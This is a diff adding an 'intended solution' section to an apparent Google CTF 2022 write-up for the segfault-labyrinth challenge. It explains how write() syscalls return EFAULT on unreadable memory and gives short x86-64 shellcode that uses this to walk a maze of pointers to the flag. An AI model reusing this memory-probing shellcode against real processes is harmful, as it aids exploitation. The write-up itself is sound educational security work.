@@ -73,6 +73,97 @@ P.S. While I am writing this write up, I notice that this wasn’t 100% consiste
 
 Flag: `CTF{c0ngratulat1ons_oN_m4k1nG_1t_thr0uGh_th3_l4Byr1nth}` 
 
+# Intended Solution - segfault maze
+
+When the code start executing, it allocated the structure shown in the graph. Each box represents a pointer, the box without an arrow points to a mmap chunk with no permission, and only one pointer within each chunk point to a readable and writable chuck. after 10 layers, the pointer point to the flag.
+
+![mmap structure](/img/GoogleCTF2022-segfault-labyrinth-mmap-structure.png)
+
+In order to retrieve the flag, we need to carefully navigate through this maze, as any segfault will end out attempt and close the connection.
+
+# Syscall - write
+
+So how do we distinguish between a readable/writable chunk from the other chunk? Directly accessing the memory clearly doesn’t work, as it would just raise a segfault error. How about syscall?
+
+If we look at the man page for write, you will notice that if we supply a not readable address as buf, the syscall will return EFAULT, BUT IT WOULDN”T SEGFAULT!!
+
+```
+WRITE(2) Linux Programmer's Manual
+
+NAME
+       write - write to a file descriptor
+
+SYNOPSIS
+       #include <unistd.h>
+
+       ssize_t write(int fd, const void *buf, size_t count);
+
+[...]
+
+ERRORS
+       EAGAIN The file descriptor fd refers to a file other than a socket and has been marked nonblocking (O_NONBLOCK), and the write would block.  See open(2) for further details on the O_NONBLOCK flag.
+
+       EAGAIN or EWOULDBLOCK
+              The file descriptor fd refers to a socket and has been marked nonblocking (O_NONBLOCK), and the write would block.  POSIX.1-2001 allows either error to be returned for this case, and does not require these constants
+              to have the same value, so a portable application should check for both possibilities.
+
+       EBADF  fd is not a valid file descriptor or is not open for writing.
+
+       EDESTADDRREQ
+              fd refers to a datagram socket for which a peer address has not been set using connect(2).
+
+       EDQUOT The user's quota of disk blocks on the filesystem containing the file referred to by fd has been exhausted.
+
+       EFAULT buf is outside your accessible address space.
+
+       EFBIG  An attempt was made to write a file that exceeds the implementation-defined maximum file size or the process's file size limit, or to write at a position past the maximum allowed offset.
+
+       EINTR  The call was interrupted by a signal before any data was written; see signal(7).
+
+       EINVAL fd  is  attached to an object which is unsuitable for writing; or the file was opened with the O_DIRECT flag, and either the address specified in buf, the value specified in count, or the file offset is not suitably
+              aligned.
+
+       EIO    A low-level I/O error occurred while modifying the inode.  This error may relate to the write-back of data written by an earlier write(), which may have been issued to a different file descriptor on the  same  file.
+              Since  Linux  4.13,  errors  from  write-back  come with a promise that they may be reported by subsequent.  write() requests, and will be reported by a subsequent fsync(2) (whether or not they were also reported by
+              write()).  An alternate cause of EIO on networked filesystems is when an advisory lock had been taken out on the file descriptor and this lock has been lost.  See the Lost locks section of fcntl(2) for  further  de‐
+              tails.
+
+       ENOSPC The device containing the file referred to by fd has no room for the data.
+
+       EPERM  The operation was prevented by a file seal; see fcntl(2).
+
+       EPIPE  fd  is connected to a pipe or socket whose reading end is closed.  When this happens the writing process will also receive a SIGPIPE signal.  (Thus, the write return value is seen only if the program catches, blocks
+              or ignores this signal.)
+
+       Other errors may occur, depending on the object connected to fd.
+```
+
+With this behavior, we just need to attempt to write out the content of the pointer, if it actually write out, then we know that chuck is readable, and we can advance to the next layer. This lead to the following shellcode.
+
+```c
+init:
+//r14 = current chunk, r15 = index
+    mov r15, -1
+    mov r14, rdi
+find:
+//attempt to write out content of the chunk pointed by r14[r15]
+    inc r15
+    mov rax, 1
+    mov rdi, 1
+    mov rdx, 0x100
+    mov rsi, [r14+r15*8]
+    syscall
+//if not successfully write out, continue to find
+    cmp rax, 0x100
+    jne find
+//if successfully write out, advance to the next layer and find
+    mov r14, rsi
+    mov r15, -1
+    jmp find
+```
+
+The output is a little bit messy as the previous writes are also shown.
+
 # Appendix - exp.py
 
 {% capture exp_py %}
